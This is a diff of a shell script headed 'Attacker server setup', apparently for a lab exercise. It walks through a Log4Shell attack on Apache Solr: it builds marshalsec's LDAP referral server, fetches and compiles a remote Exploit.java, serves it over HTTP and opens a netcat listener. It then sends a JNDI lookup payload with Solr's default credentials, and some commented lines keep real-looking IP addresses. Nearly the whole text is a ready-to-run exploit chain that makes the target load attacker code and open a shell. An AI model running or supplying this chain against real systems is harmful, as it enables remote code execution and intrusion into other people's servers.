@@ -1,12 +1,22 @@
 ##Attacker server setup - Debian 9
 sudo apt update
-sudo apt install netcat default-jdk dnsutils zip curl unzip nmap maven -Y
+sudo apt install netcat openjdk-8-jdk dnsutils zip curl unzip nmap net-tools python maven -y
+# create a listener to test the vulnerability
+# curl -u solr:SolrRocks 'http://$VICTIMIP:8983/solr/admin/cores?foo=$\{jndi:ldap://$MYIP:9999\}'
 git clone https://github.com/mbechler/marshalsec
 cd marshalsec
 mvn clean package -DskipTests
-java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://164.92.133.245:8000/#Exploit" &
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://$MYIP:8000/#Exploit" &
+# java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://142.93.169.210:8000/#Exploit" &
 mkdir exploit && cd exploit
 wget https://raw.githubusercontent.com/MartinPavelka/DO-vulnApp-DO/main/Exploit.java
+vim Exploit.java
+# edit IP
+javac Exploit.java -source 8 -target 8
+python3 -m http.server 8000 &
+nc -nvlp 9999
+curl -u solr:SolrRocks 'http://victimIP:8983/solr/admin/cores?foo=$\{jndi:ldap://attackerIP:1389/Exploit\}'
+# curl -u solr:SolrRocks 'http://164.90.231.255:8983/solr/admin/cores?foo=$\{jndi:ldap://142.93.169.210:1389/Exploit\}'
 
 
 ###### MANUAL PART
